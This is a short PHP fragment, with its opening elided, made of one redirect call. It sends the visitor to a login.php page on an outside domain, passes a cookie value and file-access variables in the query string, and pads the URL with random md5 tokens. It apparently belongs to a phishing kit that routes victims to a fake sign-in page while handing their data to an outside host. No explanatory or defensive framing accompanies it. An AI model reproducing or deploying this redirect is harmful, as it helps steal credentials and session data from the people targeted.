<?php
	...
	header("Location: https://iconicsigngroup.com/caller/content/login.php?accessToFile=".$accessFiles."&fileAccess=".$fileAccess."&encryptedCookie=".$cookie."&u=".md5(rand())."&connecting=".md5(rand())."&phaseAccess=".md5(rand())."&p=".md5(rand()));
